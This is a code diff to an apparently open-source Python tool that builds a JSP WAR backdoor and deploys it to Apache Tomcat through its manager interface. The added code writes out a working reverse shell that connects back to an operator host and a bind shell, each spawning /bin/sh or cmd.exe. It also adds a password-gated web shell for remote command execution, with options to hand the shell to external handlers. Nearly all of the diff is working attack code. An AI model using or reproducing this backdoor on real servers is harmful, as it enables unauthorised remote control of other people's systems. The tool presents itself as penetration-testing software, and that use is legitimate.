@@ -27,6 +27,7 @@
 import mechanize
 import os
 import urllib
+import time
 import urllib2
 import sys
 import random
@@ -48,12 +49,12 @@ logger = logging.getLogger()
 
 
 def establishReverseTcpListener(opts):
-    pass
+    logging.debug('Establishing listener for incoming reverse TCP shell...')
 
 def connectToBindShell(hostn, opts):
     host = hostn[:hostn.find(':')]
+    logging.debug('Shell has binded to port %s at remote host. Connecting back to it...' % opts.port)
     
-
 
 def generateWAR(code, title, appname):
     dirpath = tempfile.mkdtemp()
@@ -137,15 +138,29 @@ def prepareTcpShellCode(opts):
     host = opts.host
     port = opts.port
 
-    socketArguments = ''
+    socketInvocation = ''
     mode = chooseShellFunctionality(opts)
     if mode == 1:
         # Reverse TCP
-        socketArguments = '"%s", %s' % (host, port)
+        socketInvocation = ''' 
+        /* Reverse shell */
+        Socket socket = new Socket( "%(host)s", %(port)s );
+        Process process = Runtime.getRuntime().exec( ShellPath );
+        ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+        ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+        ''' % {'host' : host, 'port': port }
         logging.debug('Preparing additional code for Reverse TCP shell')
     elif mode == 2:
         # Bind shell
-        socketArguments = '%s' % port
+        socketInvocation = ''' 
+        /* Bind shell */
+        ServerSocket server_socket = new ServerSocket( %(port)s );
+        Socket client_socket = server_socket.accept();
+        server_socket.close();
+        Process process = Runtime.getRuntime().exec( ShellPath );
+        ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
+        ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
+        ''' % {'port': port }
         logging.debug('Preparing additional code for bind TCP shell')
     else:
         logging.debug('No additional code for shell functionality requested.')
@@ -160,67 +175,75 @@ def prepareTcpShellCode(opts):
     #       /usr/share/metasploit-framework/lib/msf/core/payload/jsp.rb
     #
     #
-    payload = ''' <%%
-  class StreamConnector extends Thread
-  {
-    InputStream ins;
-    OutputStream outs;
+    payload = '''
+    <%%
+      class StreamConnector extends Thread {
+        InputStream ins;
+        OutputStream outs;
 
-    StreamConnector( InputStream ins, OutputStream outs )
-    {
-      this.ins = ins;
-      this.outs = outs;
-    }
-
-    public void run()
-    {
-      BufferedReader bufin  = null;
-      BufferedWriter bufout = null;
-      try
-      {
-        bufin  = new BufferedReader( new InputStreamReader( this.ins ) );
-        bufout = new BufferedWriter( new OutputStreamWriter( this.outs ) );
-        char buffer[] = new char[8192];
-        int length;
-        while( ( length = bufin.read( buffer, 0, buffer.length ) ) > 0 )
-        {
-          bufout.write( buffer, 0, length );
-          bufout.flush();
+        StreamConnector( InputStream ins, OutputStream outs ) {
+          this.ins = ins;
+          this.outs = outs;
         }
-      } catch( Exception e ){}
-      try
-      {
-        if( bufin != null )
-          bufin.close();
-        if( bufout != null )
-          bufout.close();
-      } catch( Exception e ){}
-    }
-  }
 
-  try
-  {
-    String ShellPath;
-    if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
-        ShellPath = new String("/bin/sh");
-    } else {
-        ShellPath = new String("cmd.exe");
-    }
-    ServerSocket server_socket = new ServerSocket(%(socketArguments)s);
-    Socket client_socket = server_socket.accept();
-    server_socket.close();
-    Process process = Runtime.getRuntime().exec( ShellPath );
-    ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
-    ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
-  } catch( Exception e ) {}
-%%>''' % {'socketArguments': socketArguments }
+        public void run() {
+          BufferedReader bufin  = null;
+          BufferedWriter bufout = null;
+          try {
+            bufin  = new BufferedReader( new InputStreamReader( this.ins ) );
+            bufout = new BufferedWriter( new OutputStreamWriter( this.outs ) );
+            char buffer[] = new char[8192];
+            int length;
+            while( ( length = bufin.read( buffer, 0, buffer.length ) ) > 0 ) {
+              bufout.write( buffer, 0, length );
+              bufout.flush();
+            }
+          } catch( Exception e ){}
+          try {
+            if( bufin != null )
+              bufin.close();
+            if( bufout != null )
+              bufout.close();
+          } catch( Exception e ){}
+        }
+      }
+
+      try {
+        String ShellPath;
+        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
+            ShellPath = new String("/bin/sh");
+        } else {
+            ShellPath = new String("cmd.exe");
+        }
+        %(socketInvocation)s
+      } catch( Exception e ) {}
+    %%>''' % {'socketInvocation': socketInvocation}
 
     return payload
 
 
 def preparePayload(opts):
     logging.debug('Generating JSP WAR backdoor code...')
-    payload = '''<%%@ page import="java.util.*,java.io.*,java.net.*,java.lang.*"%%> <%%!
+
+    shellFunc = ''
+
+    if chooseShellFunctionality(opts) > 0:
+        shellFunc = '''
+    <%%
+        if( request.getHeader("X-Pass") != null && request.getHeader("X-Pass").equals("%(password)s")) {
+    %%>
+            %(shell)s
+    <%%
+        }
+    %%>
+    ''' % {'password' : opts.shellpass, 'shell': prepareTcpShellCode(opts)}
+
+
+    payload = '''<%%@page import="java.lang.*"%%>
+<%%@page import="java.util.*"%%>
+<%%@page import="java.io.*"%%>
+<%%@page import="java.net.*"%%>
+<%%!
     public String execute(String pass, String cmd) {
         final String hardcodedPass = "%(password)s";
         StringBuilder res = new StringBuilder();
@@ -251,7 +274,6 @@ def preparePayload(opts):
 <html>
     <head>
         <title>JSP Application</title>
-        %(shellPayload)s
     </head>
     <body>
         <h3>JSP Backdoor deployed as WAR on Apache Tomcat.</h3>
@@ -280,22 +302,35 @@ def preparePayload(opts):
                 out.println(execute(request.getParameter("password"), request.getParameter("cmd")));
             }
         %%></pre>
+    %(shellPayload)s
     </body>
-</html>''' % {'title': opts.title, 'password': opts.shellpass, 'shellPayload': prepareTcpShellCode(opts) }
+</html>''' % {'title': opts.title, 'password': opts.shellpass, 'shellPayload': shellFunc }
 
     return payload
 
-def invokeApplication(browser, url, appname):
-    appurl = 'http://%s/%s/' % (url, appname)
+def invokeApplication(browser, url, opts):
+    appurl = 'http://%s/%s/' % (url, opts.appname)
     logging.debug('Invoking application at url: "%s"' % appurl)
 
     try:
+        mode = chooseShellFunctionality(opts)
+        if opts.shellpass and mode > 0:
+            logging.debug("Adding 'X-Pass: %s' header for shell functionality authentication." % opts.shellpass)
+            browser.addheaders.append(('X-Pass', opts.shellpass))
+
+        if mode == 1 and opts.noconnect:
+            logging.warning("Set up your incoming shell listener, I'm giving you 3 seconds.")
+            time.sleep(3)
+        elif mode == 0 and opts.noconnect:
+            logging.warning("Connect back to your shell at: %s:%s" % (url[:url.find(':')], opts.port))
+        elif mode == 2 and opts.noconnect:
+            logging.warning("Shell has been binded. Go and connect back to it!")
         resp = browser.open(appurl)
         return True
 
     except urllib2.HTTPError, e:
         if e.code == 404:
-            logging.error('Application "%s" does not exist, or was not deployed.' % appname)
+            logging.error('Application "%s" does not exist, or was not deployed.' % opts.appname)
         else:
             logging.error('Failed with error: %d, msg: "%s"' % (int(e.code), str(e)))
 
@@ -413,6 +448,7 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
     parser.add_option('-t', '--title', metavar='TITLE', dest='title', help='Specifies head>title for uploaded JSP WAR payload. Default: "JSP Application"', default='JSP Application')
     parser.add_option('-n', '--name', metavar='APPNAME', dest='appname', help='Specifies JSP application name. Default: "jsp_app"', default='jsp_app')
     parser.add_option('-x', '--unload', dest='unload', help='Unload existing JSP Application with the same name. Default: no.', action='store_true')
+    parser.add_option('-C', '--noconnect', dest='noconnect', help='Do not connect to the spawned shell immediately. By default this program will connect to the spawned shell, specifying this option let\'s you use other handlers like Metasploit, NetCat and so on.', action='store_true')
     parser.add_option('-f', '--file', metavar='WARFILE', dest='file', help='Custom WAR file to deploy. By default the script will generate own WAR file on-the-fly.')
 
     opts, args = parser.parse_args()
@@ -430,9 +466,9 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
         logger.error('Both RHOST and RPORT must be specified to deploy reverse tcp payload.')
         sys.exit(0)
     elif (opts.port and not opts.host):
-        logging.info('Bind shell will be deployed as a port has been specified and host not. Binded to: 0.0.0.0:%s' % opts.port)
+        logging.info('Bind shell will be deployed on: %s:%s' % (args[0][:args[0].find(':')], opts.port))
     elif (opts.host and opts.port):
-        logging.info('Reverse shell will be deployed on: %s:%s.' % (opts.host, opts.port))
+        logging.info('Reverse shell will connect to: %s:%s.' % (opts.host, opts.port))
 
     if opts.file and not os.path.exists(file):
         logger.error('Specified WAR file does not exists in local filesystem.')
@@ -458,9 +494,6 @@ def main():
         mode = chooseShellFunctionality(opts)
         if not opts.file:
             code = preparePayload(opts)
-            print '-'*50
-            print code
-            print '-'*50
             (dirpath, warpath) = generateWAR(code, opts.title, opts.appname)
         else:
             warpath = opts.file
@@ -481,34 +514,38 @@ def main():
         else:
             logging.debug('It looks that the application with specified name "%s" has not been deployed yet.' % opts.appname)
 
-        if deployApplication(browser, url, opts.appname, warpath):
+        deployed = deployApplication(browser, url, opts.appname, warpath)
+
+        if not opts.file and dirpath:
+            logger.debug('Removing temporary WAR directory: "%s"' % dirpath)
+            shutil.rmtree(dirpath)
+
+        if deployed:
             logging.debug('Succeeded, invoking it...')
 
-            if mode == 1:
-                logging.debug('Establishing listener for incoming reverse TCP shell')
+            if mode == 1 and not opts.noconnect:
+                # if Reverse TCP - firstly establish listener, then invoke application.
                 establishReverseTcpListener(opts)
 
-            if invokeApplication(browser, args[0], opts.appname):
+            if invokeApplication(browser, args[0], opts):
                 logging.info("\033[0;32mJSP Backdoor up & running on http://%s/%s/\033[1;0m" % (args[0], opts.appname))
-                logging.info("\033[0;33mHappy pwning, here take that password: '%s'\033[1;0m" % opts.shellpass)
+                logging.info("\033[0;33mHappy pwning, here take that password for web shell: '%s'\033[1;0m" % opts.shellpass)
 
-                if mode == 2:
-                    logging.debug('Shell has binded to port %s at remote host. Connecting back to it...' % opts.port)
+                if mode == 2 and not opts.noconnect:
+                    # If Bind TCP - firstly invoke application, then connect back to it.
                     connectToBindShell(args[0], opts)
-                
+
                 if mode == 0:
                     logging.debug('No shell functionality was included in backdoor.')
             else:
                 logging.error("\033[1;41mNo pwning today, backdoor was not deployed.\033[1;0m")
+
+
         else:
             logging.error('Failed.')
 
     except KeyboardInterrupt:
         print '\nUser interruption.'
-
-    if not opts.file and dirpath:
-        logger.debug('Removing temporary WAR directory: "%s"' % dirpath)
-        shutil.rmtree(dirpath)
 
 
 if __name__ == '__main__':
